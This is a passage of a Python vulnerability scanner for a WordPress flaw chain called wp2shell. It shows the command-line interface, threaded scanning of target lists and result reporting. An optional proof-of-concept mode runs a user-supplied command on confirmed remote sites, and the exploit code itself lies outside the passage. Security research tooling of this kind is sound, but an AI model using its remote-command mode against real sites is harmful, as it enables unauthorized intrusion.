            x_action_redirect=self.x_action_redirect,
        )


def run_poc(
    target: str,
    *,
    command: str = "whoami",
    timeout: float = DEFAULT_TIMEOUT,
) -> PocResult:
    """Run the non-interactive command-verification PoC for an active target."""
    try:
        return _Wp2ShellPoC(target, timeout=timeout).run(command)
    except ValueError as exc:
        return PocResult(target=target, success=False, error=str(exc))


# ---------------------------------------------------------------------------
# Command-line interface
# ---------------------------------------------------------------------------

DISCLAIMER = (
    "Only scan systems you own or are explicitly authorized to assess. "
    "The optional -p mode changes remote WordPress state before best-effort cleanup."
)


def positive_threads(value: str) -> int:
    try:
        count = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("threads must be an integer") from exc
    if count < 1:
        raise argparse.ArgumentTypeError("threads must be at least 1")
    return count


def build_parser() -> argparse.ArgumentParser:
    """Create the grouped, researcher-focused command-line interface."""
    parser = argparse.ArgumentParser(
        prog="wp2shell-scanner",
        description="Detect the WordPress wp2shell vulnerability chain.",
        epilog=DISCLAIMER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    target_options = parser.add_argument_group("Target options")
    targets = target_options.add_mutually_exclusive_group(required=True)
    targets.add_argument("-u", "--url", metavar="URL", help="single WordPress target URL")
    targets.add_argument("-l", "--list", metavar="FILE", help="text file containing target URLs")

    scan_options = parser.add_argument_group("Scan and verification options")
    scan_options.add_argument(
        "-p",
        "--poc",
        action="store_true",
        help="run the state-changing command-verification PoC after active confirmation",
    )
    scan_options.add_argument(
        "-c",
        "--command",
        metavar="COMMAND",
        help="command for --poc instead of the default whoami",
    )
    scan_options.add_argument(
        "-t",
        "--threads",
        type=positive_threads,
        default=10,
        metavar="N",
        help="concurrent target workers for --list (default: 10)",
    )

    output_options = parser.add_argument_group("Output and presentation options")
    output_options.add_argument(
        "-o",
        "--output",
        metavar="FILE",
        help="write JSON results to FILE",
    )
    output_options.add_argument(
        "--all-results",
        action="store_true",
        help="include non-vulnerable results in --output JSON",
    )
    output_options.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="show the PoC HTTP status and X-Action-Redirect header",
    )
    output_options.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="print only normalized command output on successful PoC runs",
    )
    output_options.add_argument(
        "--no-color",
        action="store_true",
        help="disable colored terminal output",
    )
    return parser


def scan_target(
    target: str,
    *,
    run_optional_poc: bool,
    command: str | None = None,
    quiet: bool = False,
) -> tuple[ScanResult, PocResult | None]:
    """Run all phases for one target. This function is safe to submit to a worker."""
    if not quiet:
        emit("processing", f"[SCAN] {target}")
    result = Wp2ShellScanner(target, timeout=DEFAULT_TIMEOUT).scan()
    poc_result: PocResult | None = None
    if run_optional_poc and result.actively_confirmed:
        if not quiet:
            emit(
                "processing",
                f"[POC] {result.target}: actively confirmed; starting verification.",
            )
        poc_result = run_poc(
            result.target,
            command=command if command is not None else "whoami",
            timeout=DEFAULT_TIMEOUT,
        )
    return result, poc_result


def print_result(
    result: ScanResult,
    poc_result: PocResult | None,
    *,
    completed: int | None = None,
    total: int | None = None,
    verbose: bool = False,
    quiet: bool = False,
) -> None:
    """Render a scan and optional PoC outcome in semantic terminal colors."""
    if quiet:
        metadata_stream = sys.stderr if verbose else None
        if poc_result and verbose:
            status = str(poc_result.http_status) if poc_result.http_status is not None else "<none>"
            redirect = poc_result.x_action_redirect or "<none>"
            emit(
                "info",
                f"[POC HTTP] status: {status} | X-Action-Redirect: {redirect}",
                stream=metadata_stream,
            )
        if poc_result and not poc_result.success:
            emit(
                "failure",
                f"[POC FAILED] {result.target} — {poc_result.error or 'unknown PoC failure'}",
                stream=sys.stderr,
            )
        elif result.status == "error":
            suffix = result.error or result.note or "scan failed"
            emit("failure", f"[ERROR] {result.target} — {suffix}", stream=sys.stderr)
        elif poc_result and poc_result.success:
            output = normalize_command_output(poc_result.output)
            if output:
                print(output, file=sys.stdout, flush=True)
        if poc_result and poc_result.cleanup_succeeded is False:
            emit(
                "warning",
                "[POC CLEANUP WARNING] Best-effort cleanup could not be verified. "
                "Inspect the target before considering the assessment complete.",
                stream=sys.stderr,
            )
        return

    evidence: list[str] = []
    if result.version:
        evidence.append(f"WordPress {result.version}")
    if result.delta_seconds is not None:
        evidence.append(
            "timing "
            f"{result.baseline_seconds:.2f}s→{result.delayed_seconds:.2f}s "
            f"(Δ {result.delta_seconds:.2f}s)"
        )
    if result.route_markers:
        evidence.append(f"route markers: {render_markers(result.route_markers)}")
    details = f" — {'; '.join(evidence)}" if evidence else ""

    labels = {
        "vulnerable": ("failure", "[VULNERABLE]"),
        "potentially_affected": ("warning", "[POTENTIALLY AFFECTED]"),
        "not_vulnerable": ("success", "[NOT VULNERABLE]"),
        "not_wordpress": ("info", "[NOT WORDPRESS]"),
        "error": ("failure", "[ERROR]"),
    }
    level, label = labels[result.status]
    suffix = result.error or result.note or ""
    progress = f"[{completed}/{total}] " if completed is not None and total is not None else ""
    emit(
        level,
        f"{progress}{label} {result.target}{details}{f' — {suffix}' if suffix else ''}",
    )

    if not poc_result:
        return
    if verbose:
        status = str(poc_result.http_status) if poc_result.http_status is not None else "<none>"
        redirect = poc_result.x_action_redirect or "<none>"
        emit(
            "info",
            f"[POC HTTP] status: {status} | X-Action-Redirect: {redirect}",
        )
    if poc_result.success:
        output = normalize_command_output(poc_result.output)
        message = f"[POC SUCCESS] {result.target}"
        if output:
            message = f"{message}\n{output}"
        emit("success", message)
    else:
        emit(
            "failure",
            f"[POC FAILED] {result.target} — {poc_result.error or 'unknown PoC failure'}",
        )
    if poc_result.cleanup_succeeded is True:
        emit("success", "[POC CLEANUP] Temporary WordPress artifacts were removed.")
    elif poc_result.cleanup_succeeded is False:
        emit(
            "warning",
            "[POC CLEANUP WARNING] Best-effort cleanup could not be verified. "
            "Inspect the target before considering the assessment complete.",
        )


def serialize_result(
    result: ScanResult,
    poc_result: PocResult | None,
) -> dict[str, Any]:
    """Serialize a scan and its optional PoC outcome for JSON output."""
    record = asdict(result)
    if poc_result is not None:
        poc_record = asdict(poc_result)
        poc_record["output"] = normalize_command_output(poc_result.output)
        record["poc"] = poc_record
    return record


def write_json_results(
    output_path: str,
    records: Iterable[tuple[ScanResult, PocResult | None]],
    *,
    all_results: bool,
) -> None:
    """Write selected scan records as a stable, human-readable JSON array."""
    serialized = [
        serialize_result(result, poc_result)
        for result, poc_result in records
        if all_results or result.status == "vulnerable"
    ]
    Path(output_path).write_text(
        json.dumps(serialized, indent=2) + "\n",
        encoding="utf-8",
    )


def resolve_targets(args: argparse.Namespace) -> list[str]:
    """Return normalized targets from the selected CLI source."""
    if args.url:
        return [normalize_url(args.url)]
    return load_targets(args.list)


def run(args: argparse.Namespace) -> int:
    """Scan the selected targets and return the documented process exit code."""
    configure_colors(no_color=bool(getattr(args, "no_color", False)))
    quiet = bool(getattr(args, "quiet", False))
    verbose = bool(getattr(args, "verbose", False))
    command = getattr(args, "command", None)
    if command is not None and not args.poc:
        emit(
            "failure",
            "[INPUT ERROR] --command requires --poc",
            stream=sys.stderr,
        )
        return 2
    try:
        targets = resolve_targets(args)
    except ValueError as exc:
        emit("failure", f"[INPUT ERROR] {exc}", stream=sys.stderr)
        return 2

    worker_label = "worker" if args.threads == 1 else "workers"
    if not quiet:
        emit("info", f"[NOTICE] {DISCLAIMER}")
        if args.poc:
            emit(
                "warning",
                "[POC WARNING] -p enables a state-changing verification after active "
                "confirmation. Cleanup is best effort.",
            )
        emit(
            "info",
            f"[INFO] Starting scan of {len(targets)} target(s) with {args.threads} "
            f"{worker_label}.",
        )

    results: list[ScanResult] = []
    ordered_records: dict[int, tuple[ScanResult, PocResult | None]] = {}
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                scan_target,
                target,
                run_optional_poc=args.poc,
                command=command,
                quiet=quiet,
            ): (index, target)
            for index, target in enumerate(targets)
        }
        for completed, future in enumerate(as_completed(futures), start=1):
            index, target = futures[future]
            try:
                result, poc_result = future.result()
            except Exception as exc:  # Defensive final guard for bulk scans.
                result = ScanResult(target=target, status="error", error=f"worker failure: {exc}")
                poc_result = None
            print_result(
                result,
                poc_result,
                completed=completed,
                total=len(targets),
                verbose=verbose,
                quiet=quiet,
            )
            results.append(result)
            ordered_records[index] = (result, poc_result)

    counts = {
        status: sum(item.status == status for item in results)
        for status in (
            "vulnerable",
            "potentially_affected",
            "not_vulnerable",
            "not_wordpress",
            "error",
        )
    }
    if not quiet:
        emit(
            "info",
            "[SUMMARY] "
            f"total: {len(results)} | vulnerable: {counts['vulnerable']} | "
            f"potentially affected: {counts['potentially_affected']} | "
            f"not vulnerable: {counts['not_vulnerable']} | "
            f"not WordPress: {counts['not_wordpress']} | errors: {counts['error']}",
        )
    if args.output:
        try:
            write_json_results(
                args.output,
                (ordered_records[index] for index in range(len(targets))),
                all_results=args.all_results,
            )
        except OSError as exc:
            detail = exc.strerror or str(exc)
            emit(
                "failure",
                f"[OUTPUT ERROR] could not write JSON results to {args.output}: {detail}",
                stream=sys.stderr,
            )
            return 2
    if counts["error"] == len(results):
        return 2
    return 1 if counts["potentially_affected"] else 0


def main(argv: Iterable[str] | None = None) -> int:
    """Run the direct-script command-line interface."""
    init_colors()
    parser = build_parser()
    arguments = list(sys.argv[1:] if argv is None else argv)

    quiet_requested = any(argument in {"-q", "--quiet"} for argument in arguments)
    no_color_requested = "--no-color" in arguments
    configure_colors(no_color=no_color_requested)
    if not quiet_requested:
        print_banner()

    if not arguments:
        parser.print_help()
        return 2
    return run(parser.parse_args(arguments))


if __name__ == "__main__":
    raise SystemExit(main())
